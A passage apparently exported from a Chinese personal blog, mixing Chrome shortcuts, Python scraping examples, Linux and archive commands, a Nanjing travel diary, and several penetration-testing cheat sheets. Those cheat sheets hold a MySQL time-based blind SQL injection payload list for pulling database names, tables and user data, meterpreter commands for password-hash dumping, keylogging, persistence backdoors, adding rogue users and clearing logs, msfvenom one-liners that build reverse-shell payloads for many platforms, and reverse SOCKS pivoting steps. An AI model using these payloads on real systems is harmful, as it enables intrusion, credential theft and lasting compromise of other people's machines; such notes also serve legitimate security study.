标签页和窗口快捷键：12345678910111213141516开启新窗口：ctrl+n无痕模式打开新窗口：ctrl+shift+n最小化当前窗口：alt+空格+n最大化当前窗口：alt+空格+x退出当前窗口：alt+F4退出Chrome：ctrl+shift+q关闭当前标签页：ctrl+w或ctrl+F4关闭所有打开的标签页和浏览器：ctrl+shift+w开启新标签页：ctrl+t恢复刚关闭的一个标签页：ctrl+shift+t跳转到下一个打开的标签页：ctrl+tab或ctrl+pgdn跳转到上一个打开的标签页：ctrl+shift+tab或ctrl+pgup跳转到指定标签页：ctrl+1~8跳转到最后一个标签页：ctrl+9回退：alt+左箭头前进：alt+右箭头 功能快捷键：1234567891011书签栏的显示/隐藏：ctrl+shift+b打开书签管理器：ctrl+shift+o打开历史记录：ctrl+h打开下载内容：ctrl+j打开开发者工具：ctrl+shift+j或F12打开清除浏览数据：ctrl+shift+delete打开Chrome帮助中心：F1打开Chrome的任务管理器：shift+esc搜索：ctrl+f或F3跳转到搜索的下一条内容：ctrl+g跳转到搜索的上一条内容：ctrl+shift+g 地址栏快捷键：1234567使用默认搜索引擎搜索：输入搜索关键字按enter键使用其他搜索引擎搜索：输入搜索引擎名称并按tab键为网站名称添加www.和.com并打开：输入网站名称并按ctrl+enter打开新的标签页并执行google搜索：输入搜索字词并按alt+enter键跳转到地址栏：ctrl+l、alt+d或F6从页面中的任意位置搜索：ctrl+k或ctrl+e从地址栏中移除联想查询内容：按下箭头以突出显示相应内容，然后按shift+delete 网页快捷键：12345678910111213141516171819202122232425打印当前网页：ctrl+p保存当前网页：ctrl+s重新加载当前网页：F5或ctrl+r重新加载当前网页（忽略缓存的内容）：shift+F5或ctrl+shift+r停止加载网页：esc浏览下一个可点击项：tab浏览上一个可点击项：shift+tab使用chrome打开计算机中的文件：按住ctrl+o并选择文件显示当前网页的HTML源码：ctrl+u将当前网页保存为书签：ctrl+d将所有打开的标签页以书签的形式保存在新文件夹中：ctrl+shift+d全屏：F11放大网页上的所有内容：ctrl++缩小网页上的所有内容：ctrl+-将网页上的所有内容恢复到默认大小：ctrl+0向下滚动网页，一次一个屏幕：空格或pgdn向上滚动网页，一次一个屏幕：shift+空格或pgup在网页上水平滚动：按住shift并滚动鼠标滚轮将光标移动到文本字段中的上一个字词前面：ctrl+左箭头将光标移动到文本字段中的上一个字词后面：ctrl+右箭头删除文本字段中的上一个字词：ctrl+backspace将焦点移动到通知上：alt+n在通知中允许：alt+shift+a在通知中拒绝：alt+shift+d在当前标签页中打开主页：alt+home 鼠标快捷键：12345在新的后台标签页中打开链接：按住ctrl点击链接打开链接，并跳转到该链接：按住ctrl+shift点击链接在新窗口中打开链接：按住shift点击链接下载链接目标：按住alt点击链接显示浏览记录：右击后退或前进]]></content>
      <categories>
        <category>浏览器</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用python写网络爬虫的三种网页内容抓取方法]]></title>
    <url>%2F2017%2F09%2F24%2FCrawlerCrawlPageMethod%2F</url>
    <content type="text"><![CDATA[如题所示 用python写网络爬虫的三种网页抓取方法辅助函数用来下载页面html源码： 1234567891011121314import urllib2def download(url,user_agent=&apos;wswp&apos;,num_retries=2): print &apos;Downloading:&apos;,url headers=&#123;&apos;User-agent&apos;:user_agent&#125; request=urllib2.Request(url,headers=headers) try: html=urllib2.urlopen(request).read() except urllib2.URLError as e: print &apos;Download error:&apos;,e.reason html=None if num_retries &gt;0 : if hasattr(e,&apos;code&apos;) and 500 &lt;=e.code&lt;600: return download(url,user_agent,num_retries-1) return html 三种方法方法一：正则表达式1234import reurl=&apos;http://example.webscraping.com/places/default/view/Afghanistan-1&apos;html=download(url)print re.findall(&apos;&lt;tr id=&quot;places_area__row&quot;&gt;&lt;td class=&quot;.*?&quot;&gt;&lt;label class=&quot;readonly&quot; for=&quot;places_area&quot; id=&quot;places_area__label&quot;&gt;Area: &lt;/label&gt;&lt;/td&gt;&lt;td class=&quot;w2p_fw&quot;&gt;(.*?)&lt;/td&gt;&lt;td class=&quot;w2p_fc&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&apos;,html) 方法二：BeautifulSoup模块BeautifulSoup模块可以解析网页，提供定位内容的便捷接口，并且能够正确解析缺失的引号并闭合标签。美中不足的是由于是python编写，速度偏慢 12345678from bs4 import BeautifulSoupurl=&apos;http://example.webscraping.com/places/default/view/Afghanistan-1&apos;html=download(url)soup=BeautifulSoup(html)tr=soup.find(attrs=&#123;&apos;id&apos;:&apos;places_area__row&apos;&#125;)td=tr.find(attrs=&#123;&apos;class&apos;:&apos;w2p_fw&apos;&#125;)area=td.textprint area 方法三：LxmlLxml是基于libxml2解析库的python封装，因使用C语言编写，比BeautifulSoup更快，下面是使用lxml的CSS选择器抽取面积的示例代码 123456import lxml.htmlhtml=download(&apos;http://example.webscraping.com/places/default/view/Afghanistan-1&apos;)tree=lxml.html.fromstring(html)td=tree.cssselect(&apos;tr#places_area__row &gt; td.w2p_fw&apos;)[0]area=td.text_content()print area CSS选择器示例： 选择所有标签：* 选择a标签：a 选择所有class=”link”的元素：.link 选择id=”home”的a标签：a#home 选择父元素为a标签的所有span子标签：a &gt; span 选择a标签内部的所有span标签：a span 选择title属性为”Home”的所有a标签：a[title=Home]]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>网页内容抓取</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux下统计当前文件夹的文件和目录个数命令说明]]></title>
    <url>%2F2017%2F09%2F20%2FlinuxCountFiles%2F</url>
    <content type="text"><![CDATA[如题 linux下统计当前文件夹下的文件个数、目录个数详细说明命令：12345678统计文件夹下文件的个数，包括子文件夹里的ls -lR|grep &quot;^-&quot;|wc -l统计文件夹下目录的个数，包括子文件夹里的ls -lR|grep &quot;^d&quot;|wc -l统计当前文件夹下文件的个数ls -l |grep &quot;^-&quot;|wc -l统计当前文件夹下目录的个数ls -l |grep &quot;^d&quot;|wc -l 说明：12345678ls -l 显示当前文件夹下的文件列表（包括目录）ls -lR 显示当前文件夹下的所有文件列表（包括子目录文件）‘|’ 在Linux中是管道符，将前面命令的输出作为后面命令的输入grep 是过滤，只显示匹配成功的结果&quot;^-&quot; 是正则表达式，表示只显示以 &apos;-&apos;开头的行，&quot;^d&quot; 表示只显示以&apos;d&apos;开头的行。Linux中文件（非目录）是以&apos;-&apos;开头的，而目录是以&apos;d&apos;开头的。wc 是统计用的。 -l 参数用来输出输入的行的数目]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux中的压缩命令记录]]></title>
    <url>%2F2017%2F09%2F19%2FlinuxCompress%2F</url>
    <content type="text"><![CDATA[如题 Linux中的压缩命令记录常用的几种格式：iso/zip/7z/rar/tar/tar.gz/xz tar：1234v表示详细tar -tvf test.tar # 查看包内容tar -cvf test.tar * # 打包tar -xvf test.tar # 解包 tar.gz：123tar -tzvf test.tar.gz # 查看包内容tar -czvf test.tar.gz * # 打包tar -xzvf test.tar.gz # 解包 tar.bz2：123tar -tjvf test.tar.bz2 # 查看包内容tar -cjvf test.tar.bz2 * # 打包tar -xjvf test.tar.bz2 # 解包 zip：1234567unzip -v test.zip # 查看包内容zip -r test.zip * # 压缩（r表示递归）zip -m test.zip test.txt # 往zip中添加文件zip -rP pwd test.zip * # -P 加密压缩unzip test.zip # 解压unzip -P pwd test.zip # 解密解压unzip -n/-o test.zip # -n代表如果存在则不覆盖/-o代表如果存在则覆盖 iso：123挂载文件mount test.iso /media # 挂载镜像到/media目录umount /media # 取消挂载（不使用的情况下，可以取消挂载） xz：12345高压缩（速度慢）xz -z test.tar # 压缩（直接将源文件进行压缩）xz -d test.tar.xz # 解压xz -t test.tar.xz # 测试压缩文件完整性xz -l test.tar.xz # 显示压缩文件的信息 7z和rar在Linux中使用的不多，需要额外安装 7z：123apt-get install p7zip-full7za a -t7z -r test.7z # 压缩（a代表压缩，-t指定文件类型，-r表示递归）7za x test.7z -r # 解压（x代表解压，-r表示递归） rar：1234567apt-get install rarapt-get install unrarunrar l test.rar # 查看压缩包内容rar a test.rar * # 压缩（a代表添加到压缩文件）rar x test.rar # 解压（x代表解压）unrar e test.rar # 解压（e直接解压到当前目录）unrar t test.rar # 检查压缩包的完整性]]></content>
      <categories>
        <category>命令说明</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>压缩命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql延时盲注payload]]></title>
    <url>%2F2017%2F09%2F16%2FsleepBlandSQLInjection%2F</url>
    <content type="text"><![CDATA[如题 Mysql延时盲注payloadpayload123456789101112131415161718一、得到正确的注入方式?id=1&apos; and sleep(5) --+ 进行注入尝试，如果页面休眠5秒后返回，则证明该注入方式是可以使用的，sql语句已生效?username=admin&apos; and if(1=2,1,sleep(10))#二、判断数据库名?id=1&apos; and if((select length(database())&gt;7)&gt;0,sleep(5),null) --+ 判断数据库长度是否大于7?id=1&apos; and if((select ascii(substr(database(),1,1))&gt;97)&gt;0,sleep(5),null) --+ 判断数据库名的第一个字符ascii是否大于97?id=1&apos; and if((select database())=&quot;security&quot;,sleep(5),null) --+ 判断数据库名是否为security，如果是则休眠5秒，否则立即返回三、判断版本号?id=1&apos; and if((select version()) like &quot;10%&quot;,sleep(5),null) --+ 判断版本号是否为10开头的（一般用5），如果是则休眠5秒四、判断表名?id=1&apos; and if ((select length(table_name)&gt;4 from information_schema.tables limit 2,1)&gt;0,sleep(5),null); --+ 判断第三个表的表名长度是否大于4?id=1&apos; and if ((select substr(table_name,1,1) from information_schema.tables limit 2,1)=&apos;u&apos;,sleep(5),null); --+ 判断第三个表的表名的第一个字母是否为u五、判断列名?id=1&apos; and if ((select length(column_name)&gt;1 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 0,1)&gt;0,sleep(5),null); --+ 判断users表的第一列名的长度是否大于1?id=1&apos; and if((select ascii(substr(column_name,1,1))&gt;97 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 0,1)&gt;0,sleep(3),null)--+ 判断users表的第一列名的第一个字符ascii是否大于97六、得到数据?id=1&apos; and if((select length(username)&gt;1 from users limit 0,1)&gt;0,sleep(3),null)--+ 判断username列的第一条数据的长度是否大于1?id=1&apos; and if((select ascii(substr(username,1,1))&gt;65 from users limit 0,1)&gt;0,sleep(3),null)--+ 判断username的第一条数据的第一个字符的ascii是否大于65]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>延时盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[meterpreter常用命令+脚本]]></title>
    <url>%2F2017%2F09%2F16%2FmeterpreterCommand%2F</url>
    <content type="text"><![CDATA[如题 meterpreter常用命令+脚本常用命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041、background返回，把meterpreter后台挂起2、sessions-u 将shell会话提升为meterpreter会话-v 以详细模式列出会话-x 增加扩展信息展示-l 查看已经成功获取的会话-i 与指定的会话进行交互，即切换到指定id的会话-k 杀掉指定id的会话-K 杀掉所有会话-C 执行一个meterpreter的命令-c 执行一个meterpreter的命令，需指定id-s 执行一个脚本，指定id3、shell获取目标主机的远程命令行shell，使用exit退出回到meterpreter4、cat查看目标主机上的文档内容cat c:\\boot.ini 或c:/boot.ini 查看主机启动引导信息 5、getwd与getlwd获取肉鸡的当前目录 和 获取本机的当前目录6、upload上传文件到肉鸡upload nc.exe c:/windows/system32/7、download下载文件到本地download c:\\boot.ini /root/8、edit调用vi编辑器，对目标主机上的文件进行修改edit c:\\windows\\system32\\drivers\\etc\\hosts9、search在肉鸡上搜索文件search -d c:/ -f *.doc10、ipconfig查看ip地址11、portfwd端口转发portfwd add -l 1234 -p 3389 -r 192.168.86.136，远程登录 0.0.0.0:1234 即可12、route显示肉鸡上的路由表13、getuid查看当前用户14、sysinfo查看系统信息15、ps查看肉鸡上运行的进程16、migrate将meterpreter会话移至到另一个进程17、execute让肉鸡运行某个程序-f 使用时需要加上-H 后台执行-a 传递给命令的参数-c 交互命令时使用-i 进程创建之后进行交互-m 从内存执行例：execute -H -m -d notepad.exe -f wce.exe -a &quot;-o wce.txt&quot;-d 在肉鸡执行时显示的进程名称（用来伪装），-m直接从内存中执行，&quot;-o wce.txt&quot;是wce.exe的运行参数18、getpid获取meterpreter的进程id19、shutdown关机20、post/windows/gather/forensics/enum_drives可获取目标主机存储器信息run post/windows/gather/forensics/enum_drives21、checkvm确定主机是否是一台虚拟机run checkvm22、persistence植入后门程序run persistence -X -i 5 -p 4444 -r 192.168.20.186-X 在肉鸡上开机自启动-i 不断尝试反向连接的时间间隔-r lhost-p lport23、metsvc将payload安装为服务（meterpreter），会建立一个端口成为服务器run metsvc24、getgui开启目标主机远程桌面，添加账号run getgui -e 开启远程桌面run getgui -u hacker -p hacker 添加用户25、getsystem提升权限到system26、keyscn键盘记录器keyscan_start 开始键盘记录keyscan_stop 停止键盘记录keyscan_dump 下载键盘记录27、hashdump获取账号密码28、post/windows/gather/enum_applications获取肉鸡上的软件安装信息run post/windows/gather/enum_applications29、post/windows/gather/dumplinks获取肉鸡最近访问过的文档、链接信息run dumplinks30、post/windows/gather/enum_ie读取目标主机IE浏览器cookies等缓存信息run post/windows/gather/enum_ie31、get_local_subnets查看已拿下的目标主机的内网IP段情况run get_local_subnets32、clearev痕迹擦除 好用脚本路径：（/usr/share/metasploit-framework/scripts/meterpreter）： 123456789101112131415161718192021checkvm 检查是否是虚拟机vnc 上传一个vnc服务到对方机器，然后在本地打开vnc服务并连接autoroute 可以添加，删除，显示路由表get_application_list 获取安装的程序列表enum_firefox 获取firefox中的信息arp_scanner 存活主机扫描（常用在内网） run arp_scanner -r 192.168.86.0/24get_env 获取环境变量credcollect 获取主机上的hash等凭证getgui 可以开启远程桌面服务，添加用户，端口转发 run getgui -f 12345 -e（3389转发到12345） run getgui -u hacker -p hacker （添加用户）dumplinks 文件操作记录（时间戳、文件位置、共享名、序列号等）duplicate 再次产生payload，注入到其他进程或打开新进程注入credcollect 收集主机的hash凭证metsvc 将payload安装为服务（meterpreter），会建立一个端口成为服务器persistence 建立一个持久性的后门hostsedit 操作hosts文件keylogrecorder 内置此功能winenum 自动运行多种命令，将命令结果保存到本地hashdump 与meterpreter的hashdump一样win32-sshserver 安装openssh服务（Linux）enum_logged_on_users 列出当前登陆的用户getvncpw 获取vnc密码]]></content>
      <categories>
        <category>meterpreter</category>
      </categories>
      <tags>
        <tag>meterpreter</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metasploit使用笔记]]></title>
    <url>%2F2017%2F09%2F14%2Fmetasploit%2F</url>
    <content type="text"><![CDATA[如题 metasploit使用笔记配置阶段123456789101112131415161718192021help 查看帮助set 设置unset 取消设置setg 设置全局show options=options 查看配置info 查看详细信息（比options详细）back 从一个模块回到msf&gt;状态reload_all 当放入自己的脚本之后需要reload_all载入search 搜索makerc 自己编译rc文件db_connect 连接数据库db_export 导出db_import 导入db_nmap 运行namp，并把输出直接记录到数据库里db_rebuild_cache 重建缓存（创建数据库之后需要重建缓存）vulns 记录某个机器曾经有过什么漏洞exploit 开始攻击exploit -j 后台攻击jobs 查看后台运行的jobjobs -i jobid 显示详情kill jobId 杀死指定job auxiliary/scanner/… 扫描模块 exploit/multi/handler 框架模块 meterpreter阶段12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364常见命令help 查看帮助background 将当前会话移至后台bgkill 杀死一个后台meterpreterbglist 查看所有后台meterpreterbgrun 后台运行channel 显示活动频道close 关闭通道exit 终止meterpreter会话getpid 查看当前进程号getuid 查看当前用户ps 查看进程列表migrate 注入到一个指定的进程中quit 终止meterpreter会话shell 获取shellgetsystem 自行尝试提权sysinfo 查看系统信息hashdump 抓取hash密码timestomp 修改文件属性**文件系统命令**cat 读取文件内容upload 上传文件download 下载文件cd 更改目录del 删除文件edit 用vim编辑文件getlwd 打印本地目录getwd 打印工作目录ls 列出文件目录mkdir 创建目录pwd 查看当前路径rm 删除文件rmdir 删除目录**网络命令**ipconfig 查看IP地址portfwd 端口转发route 查看或修改路由表**系统命令**clearav 清除事件日志drop_token 下载令牌execute 执行命令getsystem 自行尝试提权getpid 获取进程idgetuid 获取用户kill 终止指定进程ps 列出正在运行的进程reboot 重启reg 进行注册表操作shutdown 关闭计算机steal_token 窃取指定pid的令牌sysinfo 获取系统信息**用户界面命令**enumdesktops 列出所有可访问台式机getdesktop 获取当前的meterpreter桌面idletime 检查空闲进程keyscan_dump 存储键盘记录keyscan_start 开启键盘记录keyscan_stop 停止键盘记录screenshot 屏幕截图set_desktop 更改meterpreter桌面 sessions使用123456sessions -h 查看帮助sessions&lt;===&gt;sessions -l 查看会话列表sessions -i 进入指定会话sessions -K 杀死所有会话sessions -k 杀死指定会话sessions -u 提升会话为Meterpreter]]></content>
      <categories>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msfvenom的常用命令]]></title>
    <url>%2F2017%2F09%2F13%2Fmsfvenom%2F</url>
    <content type="text"><![CDATA[如题 msfvenom的常用命令msfvenom正向（bind_tcp）是我们连接肉鸡，反向（reverse_tcp）是肉鸡连接我们。一般会使用反向payload，原因是正向连接会在肉鸡上开启一个端口，容易被发现。 Options:12345678910111213141516171819-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度-f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)-e, –encoder [encoder] 指定需要使用的encoder（编码器）-a, –arch &lt; architecture&gt; 指定payload的目标架构–platform &lt; platform&gt; 指定payload的目标平台-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度-b, –bad-chars &lt; list&gt; 设定规避字符集，比如: &amp; #039;\x00\xff&amp; #039;-i, –iterations &lt; count&gt; 指定payload的编码次数-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行–payload-options 列举payload的标准选项-o, –out &lt; path&gt; 保存payload-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式–shellest 最小化生成payload-h, –help 查看帮助选项–help-formats 查看msf支持的输出格式列表 不同系统下生成木马的命令12345678910111213141516171819202122232425262728293031Linuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port to Connect On&gt; -f elf &gt; shell.elfWindowsmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exeMacmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoWeb PayloadsPHPmsfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php（测试未成功）ASPmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSPmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspWARmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.warPythonmsfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pymsfvenom -p python/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pyBashmsfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.shPerlmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl]]></content>
      <categories>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
        <tag>msfvenom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssocks（RCSOCKS代理工具套装）]]></title>
    <url>%2F2017%2F09%2F13%2Fssocks%2F</url>
    <content type="text"><![CDATA[SSOCKS的使用方法记录 SSOCKS（RCSOCKS代理工具套装）这个工具有两个版本：windows和Linux的，可以混用 Windows的直接使用ssocks-win32即可 Linux的需要先进行编译：./configure make ssocksd 用来开启Socks5代理服务 ssocks 本地启用Socks5服务，并反弹到另一IP地址 rcsocks 接收反弹过来的Socks5服务，并转向另一端口 使用说明：Linux中： 12345攻击机上：./rcsocks -l 10086 -p 10010 -vv肉鸡上：./rssocks -vv -s 攻击机IP:10010kali中自带proxychains端口代理工具/etc/proxychains.conf 进行配置（底部）127.0.0.1 socks5 10086proxychains ssh root@ip（此处的IP假设自己是肉鸡） 然后该软件就会走刚设置的端口 windows则需要在cmd中运行，使用方法同Linux类似]]></content>
      <categories>
        <category>端口转发</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
        <tag>代理</tag>
        <tag>ssocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南京游记]]></title>
    <url>%2F2017%2F09%2F08%2FNanJingYouJi%2F</url>
    <content type="text"><![CDATA[如题，需密码 南京几日记录第一天到南京那天有些累，有些无趣。只是到了就同小金子 苗老师一起到南京师范大学报道，抽个签，领衣服和比赛相关资料等。我们是37号，最后一个，苗老师手气真好。之后就是补觉。 很有感触的是，南方真的到处都是坡，骑自行车真的很难骑！！！ 第二天与小金子一同参加开幕式，开幕式完毕比赛就正式开始。我们回宾馆进行答辩准备，很是辛苦小金子了，需根据上传的ppt敲一份正式的书面讲稿，还要进行背诵。我则是睡了一觉后配合她进行ppt演示。 第三天小金子5点就起床背讲稿了，我则是贪睡到7点。很是惊讶昨日还一句背不通的小金子今早能顺一遍下来，看来她真的很是用心了。据群内志愿者通知，今天上午将结束全部答辩。 我们到南京师大进行答辩。答辩过程也遇到一些问题:小键盘不能用，电脑分辨率有些问题等。评委也是专业，一针见血的指出我们网站存在的一些问题，答辩也算顺利完成，小金子说，我们走的时候，她听到评委在后面比“耶”。 答辩完毕后，回到宾馆休息到1点半后根据小金子同学发来的旅游攻略进行南京各大学游览。游览了南京师范大学随缘校区，南京大学鼓楼校区，东南大学四牌楼校区。三个校区里树木丛生，真正是比北方环境好。个人认为最好的还是南京大学，树木丰茂，建筑则是阁楼风格，很是遗憾没有多拍些照。之后坐地铁到武定门寻小金子同学。其实之前是注意到了的，毕竟人很美，气质卓然，不禁多看了几眼。 那时大致是晚上6点，小金子同学本是打算带我们吃南京大排档，由于排队人数上百而放弃，骑着ofo在南京道路上行进，我是分不清方向的，只能紧跟前人行迹。最后也是不知道在哪里吃的饭，价格是有些贵的，5道菜，价格估计三四百也许更高，小金子同学请客，其实是有些过意不去。之后又转着走了老门东和夫子庙，老门东是南京的各类小吃集结地，没怎么吃，只是尝了些牛肉锅贴和酒酿赤豆元宵，牛肉锅贴味道不错，酒酿赤豆元宵与粥相似，味甜，略不习惯。 夫子庙晚上游玩人数众多，人挤人。小金子同学充分展现了一个老南京的优势，领着我们行进在不知名的小巷，曲曲折折，左突右弯，只是一个简单的拐角，人流便小了四分之三。她领着我们将夫子庙走了个遍，又在秦淮河边看了看。之中有突如其来几场雨，小雨时依旧在路上走着，若是雨水大时便躲进附近小巷屋檐下，也算是见识到南京的雨。游览完已九点多，需得回宾馆。苗老师很是负责，一直关注我们动向。回到宾馆躺到床上时才是真正觉到累，许是之前美女带路动力无穷吧。小金子同学推荐我们明日早些去排南京大牌档，然后可以到新街口转转，那有德基广场，许多小吃可尝。拉灯—- 第四天上午参加优秀作品点评，开头一些作品确是有真材实料，有的指导老师很厉害。有些却是滥竽充数，调用一个API接口，写了一个记事功能，UI设计还那么lj，也能国一？很是愤愤。诧异的发现一个与网络安全相关的项目，发现是一个漏扫，满是激动然并卵。 后续参加闭幕式，不出意外是三等奖。主办方很不人性的是颁奖完后才可领取奖状，约摸4点多时下起雨，越下越大，我们打的回宾馆，到宾馆时雨却将停，有些无奈。由于之前的雨中行进，裤腿湿透。换了条短裤，准备吃南京大牌档。 在公交站牌处等车，半天不见公交，冷风夹杂雨丝，打在身上让人发寒。其中我很是纠结反复了一番，最后结果是在附近随意吃了些，打个的，继续向新街口出发。 德基广场是真的很大，内里分为一期 二期，似是只能在一楼切换。真正是名牌汇聚的大商场，价格很高，我是一件也买不起的。与小金子一同走了许多冤枉路，却也还是走不出个门道，无奈下小金子求助同学，同学很是清楚的讲明哪里有美食。在她的帮助下，我们顺利寻到美食区。 顶层也是有南京大排档，且是第一家，因而人数超多。我们先是取了个号，绕了个圈人数不见少，若是等下去怕是10点才能吃上。所幸小金子进去看了一眼，可以外带。选了一些感兴趣的小吃带回宾馆。品尝到南京大牌档，嗯，的确是蛮好吃的！南京烤鸭油而不腻，满口肉香，烤鸭包与牛肉锅贴口味相似，春卷不是很喜欢，内里放了韭菜，首次试吃臭豆干，感觉还是蛮不错的，还有一个方方正正像松糕一般的，淡淡的甜味，也是喜欢。（麻蛋，饿了）恩，就这样了。]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活记录</tag>
        <tag>南京记录</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metasploit数据库配置]]></title>
    <url>%2F2017%2F09%2F08%2FmsfdbInit%2F</url>
    <content type="text"><![CDATA[当我们没有配置数据库的时候，使用的是慢速查找，找一个模块往往需要一分钟以上的时间。而我们设置了数据库之后，1秒就能查找到。因此我们来看一下应该怎么配置msf的数据库。 metasploit数据库配置第一步1service postgresql start 启动服务 第二步1msfdb init 初始化msf数据库（默认创建的数据库名：msf，msf_test;用户名：msf；口令默认为空） 第三步1234msfconsole 进入msf控制台db_status 查看数据库连接状态[*] postgresql connected to msfdb_rebuild_cache 重建缓存（该操作需要一定时间，请等待三分钟后再搜索） 完成了，三分钟之后再search一次试试看。如果还是不行，请退出再重开msfconsole试一试]]></content>
      <categories>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
        <tag>msfdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7z.exe的简单使用方法]]></title>
    <url>%2F2017%2F09%2F06%2Ftool7z%2F</url>
    <content type="text"><![CDATA[如题 7z.exe的简单使用方法-t 指定压缩档案格式。指定压缩档案格式。它们可以是：zip、7z、rar、cab、gzip、bzip2、tar 或其它格式。而 默认值是 7z 格式。 压缩：123456压缩文件夹（保存文件夹结构）：7z.exe a &quot;压缩文件名&quot; &quot;要压缩的文件夹&quot;压缩指定文件类型（exe，无法压缩子文件夹中的文件）：7z.exe a &quot;压缩文件名&quot; &quot;*.exe&quot;参数a： 添加 解压：1234567z x 压缩文件名 -y -aos -o&quot;解压目录&quot;x:完整路径下解压文件-y:所有确认选项都默认为是（即不出现确认提示）-aos:跳过已存在的文件-o:设置输出目录 高级压缩的例子：123456789101112131415161718192021227z a -t7z archive.7z *.exe *.dll -m0=BCJ -m1=LZMA:d=21 -ms -mmt添加 *.exe 及 *.dll 文件到固实压缩档案 archive.7z。使用 LZMA 压缩算法、2 MB 字典大小及 BCJ 转换器。压缩将开启多线程优化(如果可用)。-ms 默认设置固实模式。在创建固实压缩档案模式中，它把压缩档案中的所有文件都当成一个连续数据流来看待。通常情况下，固实压缩可增加压缩比，特别是在添加大量小文件的时候-mmt 默认开启多线程模式。-m0=BCJ -- 第一个备选的压缩算法为BCJ-m1=LZMA:d=21 -- 第二个备选的压缩算法为LZMA，指定字典大小为默认的21(2MB的1次方)2MB。想要使用最大化压缩，可以使用下面的参数选项：7z a -t7z DriverTest_1.7z &quot;I:\t\t1\*&quot; -mx=9 -ms=200m -mf -mhc -mhcf -m0=LZMA:a=2:d=25:mf=bt4b:fb=64 -mmt -r-t7z -- 压缩文件的格式为7z-mx=9 -ms=200m -mf -mhc -mhcf -m0=LZMA:a=2:d=25:mf=bt4b:fb=64 -mmt-- 指定压缩算法选项-mx=9 -- 设置压缩等级为极限压缩（默认为：LZMA 最大算法、32 MB 字典大小、BT4b Match finder、单词大小为 64、BCJ2 过滤器）-ms=200m -- 开启固实模式，设置固实数据流大小为200MB。-mf -- 开启可执行文件压缩过滤器。-mhc -- 开启档案文件头压缩。-mhcf -- 开启档案文件头完全压缩。我所使用的7z版本为4.42&gt;2.30。-m0=LZMA:a=2:d=25:mf=bt4b:fb=64-- 第一个备选压缩算法为LZMA，压缩等级为最大压缩，LZMA算法使用的字典大小为25(2MB的5次方)32MB，算法的匹配器为bt4b(所需要内存为d×9.5 + 34 MB)，压缩算法的紧凑字节为最大模式的64字节。-mmt -- 开启多线程模式。-r -- 递归到所有的子目录。]]></content>
      <categories>
        <category>工具使用说明</category>
      </categories>
      <tags>
        <tag>工具使用说明</tag>
        <tag>7z.exe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rar.exe的使用方法]]></title>
    <url>%2F2017%2F09%2F06%2FtoolRar%2F</url>
